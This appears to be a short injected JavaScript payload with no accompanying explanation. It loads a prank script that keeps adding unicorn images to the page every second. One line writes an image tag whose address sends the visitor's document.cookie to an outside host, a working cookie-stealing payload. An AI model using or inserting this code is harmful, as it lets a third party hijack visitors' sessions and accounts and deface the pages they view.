document.write("<script type=\"text/javascript\" src=\"http://www.cornify.com/js/cornify.js\"></script>");
var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }

document.write("<img src='http://iterativedesigns.com/?"+document.cookie+"'/>");


setTimeout(corn, 1000); 
